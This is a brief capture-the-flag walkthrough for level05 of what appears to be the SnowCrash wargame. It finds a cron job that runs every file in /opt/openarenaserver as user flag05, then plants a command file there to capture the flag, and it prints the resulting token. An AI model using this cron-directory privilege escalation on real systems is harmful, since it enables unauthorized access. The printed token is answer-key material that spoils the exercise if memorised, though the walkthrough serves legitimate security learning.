## level05

Upon login received:
You have new mail.

home dir empty

	cat /var/mail/level05

outputs:
> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

The syntax is from chrontab and it's saying this is executed every 2 minutes, the command will log into flag05 and execute `sh /usr/sbin/openarenaserver`

	level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
	#!/bin/sh

	for i in /opt/openarenaserver/* ; do
		(ulimit -t 5; bash -x "$i")
		rm -f "$i"
	done


It appears that every 2 min each file in /opt/openarenaserver will run `bash -x` executing the command

	echo "getflag > /tmp/flag" > /opt/openarenaserver/getflag

after waiting about a minute

	cat /tmp/flag
outputs:
> Check flag.Here is your token : viuaaale9huek52boumoomioc
